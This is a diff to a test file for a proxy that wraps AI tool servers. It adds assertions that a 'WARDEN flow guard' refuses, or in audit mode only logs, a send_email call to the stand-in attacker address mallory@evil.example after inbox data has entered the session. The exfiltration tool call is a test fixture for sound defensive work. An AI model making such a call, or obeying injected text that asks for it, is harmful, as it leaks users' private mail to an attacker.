@@ -7,6 +7,7 @@ import { join, resolve } from 'node:path';
 import { WrapFrames } from '../src/wrap-wire.js';
 import { FilePinStore, pinRevision } from '../src/pin-store.js';
 import { observationPath } from '../src/wrap-state.js';
+import { flowPaths } from '../src/flow-guard.js';
 
 const root = resolve(fileURLToPath(new URL(".", import.meta.url)), '..');
 const bin = join(root, 'dist/mcp-server.js'), fixture = join(root, 'test/fixtures/wrap-server.mjs');
@@ -324,6 +325,9 @@ describe('wrap proxy', () => {
       const refused = await h.request('tools/call', { name: 'send_email', arguments: { to: 'mallory@evil.example' } });
       expect(refused.error?.message).toContain('WARDEN flow guard');
       expect(refused.error?.message).toContain('wrap cannot ask you');
+      expect(refused.error?.message).toContain('to="mallory@evil.example"');
+      const decisions = readFileSync(flowPaths(env.WARDEN_STATE_DIR, env.WARDEN_FLOW_SESSION).log, 'utf8').trim().split('\n').map(line => JSON.parse(line)).filter(e => e.event === 'pre');
+      expect(decisions.at(-1)).toMatchObject({ decision: 'ask', disposition: 'refused', approvalOutcome: 'unknown' });
       expect(readFileSync(calls, 'utf8')).not.toContain('mallory@evil.example');
       // Another server the same client wraps shares the session: the taint follows the data across servers.
       const other = harness({ dir: state(), id: 'other', flags: ['--flow', 'mail2'], env, config: { tools: mail } });
@@ -338,6 +342,8 @@ describe('wrap proxy', () => {
       await audit.request('tools/call', { name: 'read_inbox', arguments: {} });
       expect((await audit.request('tools/call', { name: 'send_email', arguments: { to: 'mallory@evil.example' } })).result).toBeDefined();
       expect(audit.stderr()).toContain('flow guard would ask');
+      const decisions = readFileSync(flowPaths(env.WARDEN_STATE_DIR, env.WARDEN_FLOW_SESSION).log, 'utf8').trim().split('\n').map(line => JSON.parse(line)).filter(e => e.event === 'pre');
+      expect(decisions.at(-1)).toMatchObject({ decision: 'ask', disposition: 'audit_only', approvalOutcome: 'unknown' });
       await audit.stop();
       const plain = harness({ dir: state(), config: { tools: mail, callText: injected } });
       await ready(plain);
